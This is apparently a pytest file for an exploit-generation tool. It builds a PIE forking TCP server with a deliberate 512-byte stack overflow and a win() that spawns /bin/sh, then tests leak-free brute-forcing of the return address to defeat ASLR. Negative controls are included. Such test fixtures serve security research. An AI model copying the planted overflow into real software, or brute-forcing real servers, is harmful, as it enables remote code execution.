"""Leak-free PIE ret2win against a FORKING TCP server (BROP-style partial overwrite).

A forking server rolls ASLR once and every child inherits that layout, so the saved return address's
second byte can be brute-forced DETERMINISTICALLY over connections -- redirecting a child into win()
with NO information leak, the case neither the leak-first path nor the one-shot 1/16 partial overwrite
can reach on a server that prints no pointer. x86-64 native (we spawn and dial localhost).
"""
import os
import shutil
import signal
import subprocess

import pytest
from lykos.analyze.dynamic import sandbox

pytestmark = pytest.mark.skipif(
    sandbox.host_arch() != "x86-64" or not shutil.which("gcc"),
    reason="BROP server fixture + socket detonation are native x86-64 only")

# A PIE forking TCP server: each accepted client is handled in a fork() (so every child shares the
# parent's ASLR layout). The handler dup2's the client socket to stdio and overflows a 64-byte
# buffer via read(), so the saved return address (offset 72 = buf + saved rbp) is attacker-
# controlled, and win()'s system("/bin/sh") then talks over the socket.
_SRV = r'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
void win(void){ system("/bin/sh"); }
void handle(int fd){ dup2(fd,0); dup2(fd,1); dup2(fd,2); char b[64]; read(fd,b,%READ%); }
int main(void){
    signal(SIGCHLD, SIG_IGN);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    int one=1; setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&one,sizeof one);
    struct sockaddr_in a; memset(&a,0,sizeof a);
    a.sin_family=AF_INET; a.sin_addr.s_addr=INADDR_ANY; a.sin_port=0;
    if(bind(s,(void*)&a,sizeof a)) return 1;
    listen(s,16);
    for(;;){ int c=accept(s,0,0); if(c<0) continue; if(fork()==0){ close(s); handle(c); _exit(0);} close(c);}
}
'''


def _build(tmp_path_factory, name, read_len):
    gcc = shutil.which("gcc") or shutil.which("cc")
    d = tmp_path_factory.mktemp(name)
    (d / "s.c").write_text(_SRV.replace("%READ%", read_len))
    exe = d / "s"
    if subprocess.run([gcc, "-fPIE", "-pie", "-fno-stack-protector", "-w", str(d / "s.c"),
                       "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build PIE forking-server fixture")
    return exe


@pytest.fixture
def server_bin(tmp_path_factory):
    return _build(tmp_path_factory, "brop", "512")          # overflow: the bug


@pytest.fixture
def server_safe_bin(tmp_path_factory):
    return _build(tmp_path_factory, "brop_safe", "sizeof b")  # bounds-fixed: no bug


def test_brute_ret2win_defeats_aslr_over_a_forking_server(server_bin):
    """The core capability, driven directly: brute the return address over connections to a live
    forking server until a child spawns a shell that EVALUATES the forgery-proof marker -- under
    REAL ASLR (randomised base each spawn), no information leak. A flipped-byte negative control
    must NOT spawn a shell."""
    from lykos.analyze.poc import attribution, brop, exploit
    tb = server_bin.read_bytes()
    win_off = exploit.elf_functions(tb)["win"]
    proc = brop.spawn_server(str(server_bin), [])
    assert proc, "could not spawn server"
    try:
        port = brop.wait_for_port(proc, timeout=5)
        assert port, "server never listened"
        markers = attribution.make_code_markers()
        oracle = brop.socket_oracle(port, markers.command + b"\n", timeout=1.0, gap=0.1)
        res = brop.brute_ret2win(oracle, 72, win_off, markers)
        assert res, "no leak-free redirect to win() over the forking server"
        payload, _nbytes, _align = res
        neg = payload[:72] + bytes([payload[72] ^ 0xFF]) + payload[73:]
        assert not markers.proves(oracle(neg)), "flipped-byte control wrongly spawned a shell"
    finally:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:                                # noqa: BLE001
            pass


@pytest.fixture
def _stage(store):
    from lykos.analyze import register
    from lykos.jobs import JobConfig, WorkerPool
    register()
    p = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    p.start()
    try:
        yield p
    finally:
        p.stop(grace=3.0)


def _drive(store, pool, exe):
    from lykos.analyze.disassemble import enqueue_disassemble
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, store.cases.create("brop").id, exe, filename="s")
    q = JobQueue(store.conn)
    for fn in (enqueue_triage, enqueue_disassemble):
        fn(q, t, force=True)
        assert pool.wait_idle(60)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="dynamic", stripped=False,
                                        mitigations={"pie": "on"}, file_type="elf")
    # offset = buf(64) + saved rbp(8); strategy=ret2win drives the PIE no-leak path. The stage
    # self-detects the forking server and brutes the return address with no leak.
    run = enqueue_exploit(q, t, params={"strategy": "ret2win", "offset": 72})
    assert pool.wait_idle(180) and q.runs.get(run.id).status == "done"
    return [pc for pc in PocDAO(store.conn).list_by_target(t.id)
            if pc.level == "L3" and pc.verified]


def test_stage_files_l3_for_a_pie_forking_server(store, _stage, server_bin):
    """End-to-end through build_exploit: a PIE forking server with a win() and a socket overflow
    reaches a confirmed L3 with no leak -- proven by a spawned shell evaluating the marker."""
    assert _drive(store, _stage, server_bin), "no confirmed L3 BROP PoC for the forking server"


def test_stage_declines_the_patched_server(store, _stage, server_safe_bin):
    """Negative control: the SAME server with the overflow removed must NOT yield a confirmed L3 --
    byte-identical but for the read length, so the decline is the missing overflow alone."""
    assert not _drive(store, _stage, server_safe_bin), "patched server wrongly credited an L3"
